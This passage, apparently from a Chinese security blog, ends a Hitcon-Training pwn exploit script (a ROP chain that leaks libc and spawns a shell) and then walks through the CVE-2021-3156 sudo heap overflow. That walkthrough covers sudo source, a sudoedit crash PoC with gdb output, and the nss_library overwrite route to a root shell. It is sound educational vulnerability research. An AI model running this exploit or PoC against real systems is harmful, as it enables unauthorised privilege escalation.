class="string">'a'</span>*<span class="number">0x28</span> + p32(buf2)</span><br><span class="line">    payload += p32(read_plt) + p32(leave) + p32(<span class="number">0</span>) + p32(buf2) + p32(<span class="number">0x100</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    <span class="comment">#write to buf and leak libc</span></span><br><span class="line">    payload = p32(buf) + p32(puts_plt) + p32(pop_ebx) + p32(puts_got)</span><br><span class="line">    payload += p32(read_plt) + p32(leave) + p32(<span class="number">0</span>) + p32(buf) + p32(<span class="number">0x100</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    libc_base = u32(p.recv(<span class="number">4</span>)) - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">    log.success(<span class="string">'libc base =&gt; '</span> + hex(libc_base))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    system_addr = libc.symbols[<span class="string">'system'</span>] + libc_base</span><br><span class="line">    <span class="comment">#jmp to get shell</span></span><br><span class="line">    payload = p32(buf2) + p32(read_plt) + p32(pop_esi_edi_ebp) + p32(<span class="number">0</span>) + p32(buf2) + p32(<span class="number">0x100</span>)</span><br><span class="line">    payload += p32(system_addr) + <span class="string">'b'</span>*<span class="number">4</span> + p32(buf2)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.send(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Hitcon-Training</category>
      </categories>
  </entry>
  <entry>
    <title>CVE-2021-3156 sudo 提权漏洞复现与分析</title>
    <url>/2021/02/04/cve-2021-3156/</url>
    <content><![CDATA[<h1 id="CVE-2021-3156-sudo-提权漏洞复现与分析"><a href="#CVE-2021-3156-sudo-提权漏洞复现与分析" class="headerlink" title="CVE-2021-3156 sudo 提权漏洞复现与分析"></a>CVE-2021-3156 sudo 提权漏洞复现与分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前几天在玄武推的公众号上看到了这个洞，当天在各大安全资讯和安全论坛都给出了该漏洞的预警，我拿漏洞公布者的PoC试了下自己的Ubuntu18.04，也在漏洞影响的范围，上次遇到这种直接打Ubuntu 18.04的洞还是谷歌project zero的一个vmcache内核提权漏洞，当时还在调cve-2020-0796这个洞，加上感觉自己不太能写出1day的exp(上次ebpf的exp算是运气好正好在看相关的洞233)，到今天github上已经见了好几个公开的PoC/Exp，在我机器上也未见成功，因此打算调一下这个洞，争取可以本机提权:D。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞公开者的博客为<a href="https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit" target="_blank" rel="noopener">CVE-2021-3156: Heap-Based Buffer Overflow in Sudo (Baron Samedit)</a>，我们在<code>wget https://www.sudo.ws/dist/sudo-1.8.31.tar.gz</code>下载一下1.8.31的源码，方便对着博客分析。</p>
<p>对于bash而言假如我们希望执行某个命令可以使用<code>bash -c [command]</code>来执行，如果我们希望以root的权限去执行某个命令的话可以直接<code>sudo [cmd]</code>，而如果我们希望以<code>shell</code>模式去执行某个命令的时候，可以使用<code>sudo -i</code>或者<code>sudo -s</code>参数，在参数说明里我们可以看到<code>-i, --login                   run login shell as the target user; a command may also be specified， -s, --shell                   run shell as the target user; a command may also be specified</code>，当我们使用上述参数时对于sudo的flags而言有两种情况：</p>
<ol>
<li>使用<code>sudo -s</code>，设置<code>MODE_SHELL</code></li>
<li>使用<code>sudo -i</code>，设置<code>MODE_SHELL|MODE_LOGIN_SHELL</code></li>
</ol>
<p>在<code>src/parse_args.c</code>里我们可以看到对于这种模式的参数处理，处理方式为将参数按照空格拼接起来，对于一些元字符使用反斜线进行转义处理，最终覆写了argv为ac这个指针数组。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">     * For shell mode we need to rewrite argv</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (ISSET(mode, MODE_RUN) &amp;&amp; ISSET(flags, MODE_SHELL)) &#123;</span><br><span class="line">	<span class="keyword">char</span> **av, *cmnd = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">int</span> ac = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (argc != <span class="number">0</span>) &#123;</span><br><span class="line">	    <span class="comment">/* shell -c "command" */</span></span><br><span class="line">	    <span class="keyword">char</span> *src, *dst;</span><br><span class="line">        <span class="comment">//得到命令的长度</span></span><br><span class="line">	    <span class="keyword">size_t</span> cmnd_size = (<span class="keyword">size_t</span>) (argv[argc - <span class="number">1</span>] - argv[<span class="number">0</span>]) +</span><br><span class="line">		<span class="built_in">strlen</span>(argv[argc - <span class="number">1</span>]) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	    cmnd = dst = reallocarray(<span class="literal">NULL</span>, cmnd_size, <span class="number">2</span>);</span><br><span class="line">	    <span class="keyword">if</span> (cmnd == <span class="literal">NULL</span>)</span><br><span class="line">		sudo_fatalx(U_(<span class="string">"%s: %s"</span>), __func__, U_(<span class="string">"unable to allocate memory"</span>));</span><br><span class="line">	    <span class="keyword">if</span> (!gc_add(GC_PTR, cmnd))</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//拼接命令并且处理转移符</span></span><br><span class="line">	    <span class="keyword">for</span> (av = argv; *av != <span class="literal">NULL</span>; av++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (src = *av; *src != <span class="string">'\0'</span>; src++) &#123;</span><br><span class="line">                <span class="comment">/* quote potential meta characters */</span></span><br><span class="line">                <span class="keyword">if</span> (!<span class="built_in">isalnum</span>((<span class="keyword">unsigned</span> <span class="keyword">char</span>)*src) &amp;&amp; *src != <span class="string">'_'</span> &amp;&amp; *src != <span class="string">'-'</span> &amp;&amp; *src != <span class="string">'$'</span>)</span><br><span class="line">                    *dst++ = <span class="string">'\\'</span>;<span class="comment">//处理转义字符，'\\'表示反斜线</span></span><br><span class="line">                *dst++ = *src;</span><br><span class="line">            &#125;</span><br><span class="line">		*dst++ = <span class="string">' '</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">	    <span class="keyword">if</span> (cmnd != dst)</span><br><span class="line">		    dst--;  <span class="comment">/* replace last space with a NUL */</span></span><br><span class="line">	    *dst = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line">	    ac += <span class="number">2</span>; <span class="comment">/* -c cmnd */</span></span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">//上述处理完毕后结果保存在dst指针指向的内存</span></span><br><span class="line">	av = reallocarray(<span class="literal">NULL</span>, ac + <span class="number">1</span>, <span class="keyword">sizeof</span>(<span class="keyword">char</span> *));</span><br><span class="line">    <span class="comment">//分配新的内存保存拼接的命令</span></span><br><span class="line">	<span class="keyword">if</span> (av == <span class="literal">NULL</span>)</span><br><span class="line">	    sudo_fatalx(U_(<span class="string">"%s: %s"</span>), __func__, U_(<span class="string">"unable to allocate memory"</span>));</span><br><span class="line">	<span class="keyword">if</span> (!gc_add(GC_PTR, av))</span><br><span class="line">	    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	av[<span class="number">0</span>] = (<span class="keyword">char</span> *)user_details.shell; <span class="comment">/* plugin may override shell */</span></span><br><span class="line">	<span class="keyword">if</span> (cmnd != <span class="literal">NULL</span>) &#123;</span><br><span class="line">	    av[<span class="number">1</span>] = <span class="string">"-c"</span>;</span><br><span class="line">	    av[<span class="number">2</span>] = cmnd;</span><br><span class="line">	&#125;</span><br><span class="line">	av[ac] = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">//最后的形式为 shell -c cmnd(shell和环境变量相关，比如我这里是zsh，shell为/usr/bin/zsh)</span></span><br><span class="line">    <span class="comment">//最终用av覆写argv</span></span><br><span class="line">	argv = av;</span><br><span class="line">	argc = ac;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>随后在<code>sudoers.c</code>中的<code>sudoers_policy_main</code>函数中调用<code>set_cmnd</code>将命令行参数存放在一个堆上的数据结构<code>user_args</code>中，这里也对元字符做了处理，假如不是<code>\\</code>+<code>space</code>的形式就跳过元字符，否则拷贝到<code>*to</code>。那么假如我们的命令行参数以<code>\\</code>结尾，那么<code>from[0]=&#39;\\&#39;;from[1]=NULL(注意NULL并非sapce范围)</code>，此时from++指向空字符，下面将空字符拷贝到了<code>*to</code>并且<code>from++</code>后执行了NULL后面的字符，此时再次进行while循环判断时很明显这里是可以继续进入循环的(如果后一个字符不为NULL)，从而赋值得以继续进行，从而产生了溢出。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) &#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * When running a command via a shell, the sudo front-end</span></span><br><span class="line"><span class="comment">		 * escapes potential meta chars.  We unescape non-spaces</span></span><br><span class="line"><span class="comment">		 * for sudoers matching and logging purposes.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">			<span class="keyword">for</span> (to = user_args, av = NewArgv + <span class="number">1</span>; (from = *av); av++) &#123;</span><br><span class="line">				<span class="keyword">while</span> (*from) &#123;</span><br><span class="line">				<span class="keyword">if</span> (from[<span class="number">0</span>] == <span class="string">'\\'</span> &amp;&amp; !<span class="built_in">isspace</span>((<span class="keyword">unsigned</span> <span class="keyword">char</span>)from[<span class="number">1</span>]))</span><br><span class="line">					from++;</span><br><span class="line">				*to++ = *from++;</span><br><span class="line">				&#125;</span><br><span class="line">				*to++ = <span class="string">' '</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			*--to = <span class="string">'\0'</span>;</span><br><span class="line">	    &#125;</span><br></pre></td></tr></table></figure>
<p>上述是我们的理论分析，在理论角度上看漏洞是存在的，但是我们在之前的漏洞中也见到过由于无法创造漏洞利用场景(比如我想提权但是exp里需要某个root用户给的capability)，这样的洞就非常鸡肋。那么在我们的分析里有几个理想条件，那么最后的这个场景，即反斜线作为cmd-line的最后一个字符从理论上来说是无法实现的，这里要求我们有<code>MODE_SHELL|MODE_LOGIN_SHELL</code>，而假如flag包含<code>MODE_SHELL</code>的话在我们之前的<code>parse_args</code>参数解析中就会将所有元字符给转义掉，也就是说会有两个反斜线，我们再按照代码走一遍会发现这样循环末尾的<code>*from=NULL</code>，因此会跳出循环。</p>
<p>再仔细对比一下二者的条件，二者的条件略有不同。我们的问题在于能否设置flag为<code>MODE_SHELL</code>以及<code>MODE_RUN</code>或者<code>MODE_EDIT</code>或者<code>MODE_CHECK</code>。</p>
<p>再看下解析参数的部分会发现好像还是不太行，假如我们使用<code>-e</code>参数设置<code>MODE_EDIT</code>或者使用<code>-l</code>参数设置<code>MODE_CHECK</code>，我们的<code>MODE_SHELL</code>参数就会被从<code>valid_flags</code>去掉。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//bug condition</span></span><br><span class="line"><span class="keyword">if</span> (sudo_mode &amp; (MODE_RUN | MODE_EDIT | MODE_CHECK)) &#123; </span><br><span class="line">            <span class="comment">//... </span></span><br><span class="line">           <span class="keyword">if</span> (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) &#123; </span><br><span class="line">           &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//escape meta char condition</span></span><br><span class="line"><span class="keyword">if</span> (ISSET(mode, MODE_RUN) &amp;&amp; ISSET(flags, MODE_SHELL)) &#123;</span><br><span class="line">    <span class="comment">//.. </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MODE_NONINTERACTIVE	0x00800000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MODE_SHELL		0x00020000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//parse_args.c</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">'e'</span>:</span><br><span class="line">		    <span class="keyword">if</span> (mode &amp;&amp; mode != MODE_EDIT)</span><br><span class="line">			usage_excl(<span class="number">1</span>);</span><br><span class="line">		    mode = MODE_EDIT;</span><br><span class="line">		    sudo_settings[ARG_SUDOEDIT].value = <span class="string">"true"</span>;</span><br><span class="line">		    valid_flags = MODE_NONINTERACTIVE;<span class="comment">//这里</span></span><br><span class="line">		    <span class="keyword">break</span>;</span><br><span class="line">            <span class="comment">//...</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">'l'</span>:</span><br><span class="line">		    <span class="keyword">if</span> (mode) &#123;</span><br><span class="line">			<span class="keyword">if</span> (mode == MODE_LIST)</span><br><span class="line">			    SET(flags, MODE_LONG_LIST);</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			    usage_excl(<span class="number">1</span>);</span><br><span class="line">		    &#125;</span><br><span class="line">		    mode = MODE_LIST;</span><br><span class="line">		    valid_flags = MODE_NONINTERACTIVE|MODE_LONG_LIST;<span class="comment">//这里</span></span><br><span class="line">            <span class="comment">//...</span></span><br><span class="line"><span class="keyword">if</span> ((flags &amp; valid_flags) != flags)</span><br><span class="line">	usage(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
<p>最后作者发现了一个可以利用的地方(盲猜是通过全局搜flag找到的)，那就是如果我们去执行sudoedit，<code>parse_args</code>函数会自动设置<code>MODE_EDIT</code>，并且不会重置<code>valid_flags</code>，而<code>valid_flags</code>默认包含了<code>MODE_SHELL</code>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Default flags allowed when running a command.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEFAULT_VALID_FLAGS	(MODE_BACKGROUND|MODE_PRESERVE_ENV|MODE_RESET_HOME|MODE_LOGIN_SHELL|MODE_NONINTERACTIVE|MODE_SHELL)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> valid_flags = DEFAULT_VALID_FLAGS;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* First, check to see if we were invoked as "sudoedit". */</span></span><br><span class="line">    proglen = <span class="built_in">strlen</span>(progname);</span><br><span class="line">    <span class="keyword">if</span> (proglen &gt; <span class="number">4</span> &amp;&amp; <span class="built_in">strcmp</span>(progname + proglen - <span class="number">4</span>, <span class="string">"edit"</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">	progname = <span class="string">"sudoedit"</span>;</span><br><span class="line">	mode = MODE_EDIT;</span><br><span class="line">	sudo_settings[ARG_SUDOEDIT].value = <span class="string">"true"</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>也就是说，加入我们执行<code>sudoedit -s</code>，就同时兼具了<code>MODE_SHELL|MODE_EDIT</code>而没有<code>MODE_RUN</code>，因此可以成功到达漏洞点。</p>
<p>我们使用下面的PoC进行测试<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb --args sudoedit -s <span class="string">'\'</span> `perl -e <span class="string">'print "A" x 65536'</span>`</span><br></pre></td></tr></table></figure></p>
<p>可以得到如下的crash<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">RAX: 0x41414141413d4131 (<span class="string">'1A=AAAAA'</span>)</span><br><span class="line">RBX: 0x40011 </span><br><span class="line">RCX: 0x5558a1d0f8e0 (<span class="string">"A AAAAAA\021"</span>)</span><br><span class="line">RDX: 0x40011 </span><br><span class="line">RSI: 0x0 </span><br><span class="line">RDI: 0x5558a1d4f8f0 </span><br><span class="line">RBP: 0x10 </span><br><span class="line">RSP: 0x7ffe6d98af70 --&gt; 0x347 </span><br><span class="line">RIP: 0x7f13b050126d (&lt;_int_malloc+3613&gt;:	mov    QWORD PTR [rdi+0x8],rax)</span><br><span class="line">R8 : 0x7f13b0857cd0 --&gt; 0x7f13b0857cc0 --&gt; 0x5558a1cf7390 --&gt; 0x0 </span><br><span class="line">R9 : 0x0 </span><br><span class="line">R10: 0x5558a1ce6010 --&gt; 0x1000000020007 </span><br><span class="line">R11: 0x4 </span><br><span class="line">R12: 0x3fff </span><br><span class="line">R13: 0x7f13b0857ca0 --&gt; 0x5558a1d4f8f0 </span><br><span class="line">R14: 0x7f13b0857c40 --&gt; 0x0 </span><br><span class="line">R15: 0x0</span><br><span class="line">EFLAGS: 0x10206 (carry PARITY adjust zero sign <span class="built_in">trap</span> INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x7f13b0501262 &lt;_int_malloc+3602&gt;:	mov    QWORD PTR [r14+0x60],rdi</span><br><span class="line">   0x7f13b0501266 &lt;_int_malloc+3606&gt;:	or     rdx,rsi</span><br><span class="line">   0x7f13b0501269 &lt;_int_malloc+3609&gt;:	mov    QWORD PTR [rcx+0x8],rdx</span><br><span class="line">=&gt; 0x7f13b050126d &lt;_int_malloc+3613&gt;:	mov    QWORD PTR [rdi+0x8],rax</span><br><span class="line">   0x7f13b0501271 &lt;_int_malloc+3617&gt;:	jmp    0x7f13b0501103 &lt;_int_malloc+3251&gt;</span><br><span class="line">   0x7f13b0501276 &lt;_int_malloc+3622&gt;:	mov    rcx,QWORD PTR [rdx+0x28]</span><br><span class="line">   0x7f13b050127a &lt;_int_malloc+3626&gt;:	jmp    0x7f13b0501280 &lt;_int_malloc+3632&gt;</span><br><span class="line">   0x7f13b050127c &lt;_int_malloc+3628&gt;:	mov    rcx,QWORD PTR [rcx+0x28]</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x7ffe6d98af70 --&gt; 0x347 </span><br><span class="line">0008| 0x7ffe6d98af78 --&gt; 0x40004 </span><br><span class="line">0016| 0x7ffe6d98af80 --&gt; 0x7d00000000 (<span class="string">''</span>)</span><br><span class="line">0024| 0x7ffe6d98af88 --&gt; 0x7 </span><br><span class="line">0032| 0x7ffe6d98af90 --&gt; 0x0 </span><br><span class="line">0040| 0x7ffe6d98af98 --&gt; 0x5558a1d06008 (<span class="string">'A'</span> &lt;repeats 200 <span class="built_in">times</span>&gt;...)</span><br><span class="line">0048| 0x7ffe6d98afa0 --&gt; 0x40030 </span><br><span class="line">0056| 0x7ffe6d98afa8 --&gt; 0xffffffffffffffb0 </span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">_int_malloc (av=av@entry=0x7f13b0857c40 &lt;main_arena&gt;, bytes=bytes@entry=0x40004) at malloc.c:4110</span><br><span class="line">4110	malloc.c: No such file or directory.</span><br><span class="line">gdb-peda$ bt</span><br><span class="line"><span class="comment">#0  _int_malloc (av=av@entry=0x7f13b0857c40 &lt;main_arena&gt;, bytes=bytes@entry=0x40004) at malloc.c:4110</span></span><br><span class="line"><span class="comment">#1  0x00007f13b05031cc in __GI___libc_malloc (bytes=0x40004) at malloc.c:3067</span></span><br><span class="line"><span class="comment">#2  0x00007f13b0a83faf in sudo_getgrouplist2_v1 (name=0x5558a1cf0748 "root", basegid=0x0, groupsp=groupsp@entry=0x7ffe6d98b0d0, </span></span><br><span class="line">    ngroupsp=ngroupsp@entry=0x7ffe6d98b0cc) at ./getgrouplist.c:101</span><br><span class="line"><span class="comment">#3  0x00007f13af36f3f7 in sudo_make_gidlist_item (pw=0x5558a1cf0718, unused1=&lt;optimized out&gt;, type=0x1) at ./pwutil_impl.c:272</span></span><br><span class="line"><span class="comment">#4  0x00007f13af36e0da in sudo_get_gidlist (pw=0x5558a1cf0718, type=type@entry=0x1) at ./pwutil.c:932</span></span><br><span class="line"><span class="comment">#5  0x00007f13af367f35 in runas_getgroups () at ./match.c:145</span></span><br><span class="line"><span class="comment">#6  0x00007f13af35a0fe in runas_setgroups () at ./set_perms.c:1714</span></span><br><span class="line"><span class="comment">#7  set_perms (perm=perm@entry=0x5) at ./set_perms.c:281</span></span><br><span class="line"><span class="comment">#8  0x00007f13af353bd4 in sudoers_lookup (snl=0x7f13af58fce0 &lt;snl&gt;, pw=0x5558a1cf0568, validated=validated@entry=0x60, </span></span><br><span class="line">    pwflag=pwflag@entry=0x0) at ./parse.c:298</span><br><span class="line"><span class="comment">#9  0x00007f13af35cd09 in sudoers_policy_main (argc=argc@entry=0x3, argv=argv@entry=0x7ffe6d98ba90, pwflag=pwflag@entry=0x0, </span></span><br><span class="line">    env_add=env_add@entry=0x0, verbose=verbose@entry=0x0, closure=closure@entry=0x7ffe6d98b7a0) at ./sudoers.c:324</span><br><span class="line"><span class="comment">#10 0x00007f13af355ef2 in sudoers_policy_check (argc=0x3, argv=0x7ffe6d98ba90, env_add=0x0, command_infop=0x7ffe6d98b828, </span></span><br><span class="line">    argv_out=0x7ffe6d98b830, user_env_out=0x7ffe6d98b838) at ./policy.c:872</span><br><span class="line"><span class="comment">#11 0x000055589ff8e02b in policy_check (plugin=0x5558a01ac780 &lt;policy_plugin&gt;, user_env_out=0x7ffe6d98b838, </span></span><br><span class="line">    argv_out=0x7ffe6d98b830, command_info=0x7ffe6d98b828, env_add=0x0, argv=0x7ffe6d98ba90, argc=0x3) at ./sudo.c:1138</span><br><span class="line"><span class="comment">#12 main (argc=argc@entry=0x4, argv=argv@entry=0x7ffe6d98ba88, envp=&lt;optimized out&gt;) at ./sudo.c:253</span></span><br><span class="line"><span class="comment">#13 0x00007f13b048dbf7 in __libc_start_main (main=0x55589ff8db80 &lt;main&gt;, argc=0x4, argv=0x7ffe6d98ba88, init=&lt;optimized out&gt;, </span></span><br><span class="line">    fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=0x7ffe6d98ba78) at ../csu/libc-start.c:310</span><br><span class="line"><span class="comment">#14 0x000055589ff8f95a in _start ()</span></span><br><span class="line">gdb-peda$</span><br></pre></td></tr></table></figure></p>
<p>这个洞对攻击者而言是非常理想的：</p>
<ol>
<li>我们可以控制<code>user_args</code>这个数据结构分配的堆块大小(通过cmd-line的长度来进行控制)</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//sudoers.c</span></span><br><span class="line"><span class="comment">/* set user_args */</span></span><br><span class="line">	<span class="keyword">if</span> (NewArgc &gt; <span class="number">1</span>) &#123;</span><br><span class="line">	    <span class="keyword">char</span> *to, *from, **av;</span><br><span class="line">	    <span class="keyword">size_t</span> size, n;</span><br><span class="line"></span><br><span class="line">	    <span class="comment">/* Alloc and build up user_args. */</span></span><br><span class="line">	    <span class="keyword">for</span> (size = <span class="number">0</span>, av = NewArgv + <span class="number">1</span>; *av; av++)</span><br><span class="line">		size += <span class="built_in">strlen</span>(*av) + <span class="number">1</span>;</span><br><span class="line">	    <span class="keyword">if</span> (size == <span class="number">0</span> || (user_args = <span class="built_in">malloc</span>(size)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		sudo_warnx(U_(<span class="string">"%s: %s"</span>), __func__, U_(<span class="string">"unable to allocate memory"</span>));</span><br><span class="line">		debug_return_int(<span class="number">-1</span>);</span><br><span class="line">	    &#125;</span><br></pre></td></tr></table></figure>
<ol start="2">
<li><p>攻击者可以独立控制溢出的大小和内容，(我们最后一个命令行参数后面跟着的是我们第一个环境变量，这部分的大小不会计算在上面malloc的sz大小内)</p>
</li>
<li><p>攻击者可以向溢出的缓冲区中写入零字节(每个命令行参数或者环境变量如果以反斜线结尾都会导致空字符被写入到user_args中)</p>
</li>
</ol>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>截止到今天网上已经公开了很多exp，根据<code>oss-security</code>披露的exp，比较好用的方法是覆写<code>nss_library</code>为<code>X/X</code>，从而加载自定义的库函数，进而get root shell。</p>
<p>为了更好理解漏洞利用，我们首先需要理解glibc的nss。其全称为<code>Name Service Switch</code>，每个Linux/Unix的操作系统中都有这样的一套称之为NSS的共享库来做一些解析，比如登录用户的用户名以及IP地址到域名的解析。比如对于DNS服务来说，它默认查看<code>/etc/resolv.conf</code>配置文件的内容进行解析，对于用户和组来说，它会默认查看<code>/etc/passwd</code>和<code>/etc/group</code>。其配置文件位于<code>/etc/nsswitch.conf</code>，其每行都规定了查找方法的规范，在GNU C Library里, 每个可用的SERVICE都必须有文件 <code>/lib/libnss_SERVICE.so.1</code> 与之对应。也就是说，GNU将每个服务实现为不同的module(shared library)，因此可以在Linux系统中找到下列相应的共享库<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">libnss_nisplus.so.2</span><br><span class="line">libnss_nis.so.2</span><br><span class="line">libnss_dns.so.2</span><br><span class="line">libnss_files.so.2</span><br><span class="line">libnss_compat.so.2</span><br><span class="line">libnss_hesiod.so.2</span><br><span class="line">/lib/libnss_ldap.so.2</span><br><span class="line">/lib/libnss_winbind.so.2</span><br><span class="line">/lib/libnss_wins.so.2</span><br></pre></td></tr></table></figure></p>
<p>当使用相应的函数时，会调用<code>__nss_lookup_function</code>进行查找。</p>
<p><img src="/2021/02/04/cve-2021-3156/7.png" alt></p>
<p>当sudo调用该函数时，<code>service_user</code>类型的参数ni是在堆上分配的，假如我们将<code>ni-&gt;library</code>置为空，即可通过<code>nss_new_service</code>分配一个library，默认的<code>ni-&gt;library-&gt;lib_handle</code>为NULL因而可以进入下面的加载部分，我们将<code>ni-&gt;name</code>覆写为<code>X/X</code>，最后经过拼接将加载<code>libnss_X/X.so.2</code>，我们将get root shell的代码编译为共享库即可。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> *</span><br><span class="line">__nss_lookup_function (service_user *ni, <span class="keyword">const</span> <span class="keyword">char</span> *fct_name)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">void</span> **found, *result;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We now modify global data.  Protect it.  */</span></span><br><span class="line">  __libc_lock_lock (lock);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Search the tree of functions previously requested.  Data in the</span></span><br><span class="line"><span class="comment">     tree are `known_function' structures, whose first member is a</span></span><br><span class="line"><span class="comment">     `const char *', the lookup key.  The search returns a pointer to</span></span><br><span class="line"><span class="comment">     the tree node structure; the first member of the is a pointer to</span></span><br><span class="line"><span class="comment">     our structure (i.e. what will be a `known_function'); since the</span></span><br><span class="line"><span class="comment">     first member of that is the lookup key string, &amp;FCT_NAME is close</span></span><br><span class="line"><span class="comment">     enough to a pointer to our structure to use as a lookup key that</span></span><br><span class="line"><span class="comment">     will be passed to `known_compare' (above).  */</span></span><br><span class="line"></span><br><span class="line">  found = __tsearch (&amp;fct_name, &amp;ni-&gt;known, &amp;known_compare);</span><br><span class="line">  <span class="keyword">if</span> (found == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="comment">/* This means out-of-memory.  */</span></span><br><span class="line">    result = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (*found != &amp;fct_name)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* The search found an existing structure in the tree.  */</span></span><br><span class="line">      result = ((known_function *) *found)-&gt;fct_ptr;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">      PTR_DEMANGLE (result);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* This name was not known before.  Now we have a node in the tree</span></span><br><span class="line"><span class="comment">	 (in the proper sorted position for FCT_NAME) that points to</span></span><br><span class="line"><span class="comment">	 &amp;FCT_NAME instead of any real `known_function' structure.</span></span><br><span class="line"><span class="comment">	 Allocate a new structure and fill it in.  */</span></span><br><span class="line"></span><br><span class="line">      known_function *known = <span class="built_in">malloc</span> (<span class="keyword">sizeof</span> *known);</span><br><span class="line">      <span class="keyword">if</span> (! known)</span><br><span class="line">	&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> !defined DO_STATIC_NSS || defined SHARED</span></span><br><span class="line">	remove_from_tree:</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	  <span class="comment">/* Oops.  We can't instantiate this node properly.</span></span><br><span class="line"><span class="comment">	     Remove it from the tree.  */</span></span><br><span class="line">	  __tdelete (&amp;fct_name, &amp;ni-&gt;known, &amp;known_compare);</span><br><span class="line">	  <span class="built_in">free</span> (known);</span><br><span class="line">	  result = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="comment">/* Point the tree node at this new structure.  */</span></span><br><span class="line">	  *found = known;</span><br><span class="line">	  known-&gt;fct_name = fct_name;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> !defined DO_STATIC_NSS || defined SHARED</span></span><br><span class="line">	  <span class="comment">/* Load the appropriate library.  */</span></span><br><span class="line">	  <span class="keyword">if</span> (nss_load_library (ni) != <span class="number">0</span>)</span><br><span class="line">	    <span class="comment">/* This only happens when out of memory.  */</span></span><br><span class="line">	    <span class="keyword">goto</span> remove_from_tree;</span><br><span 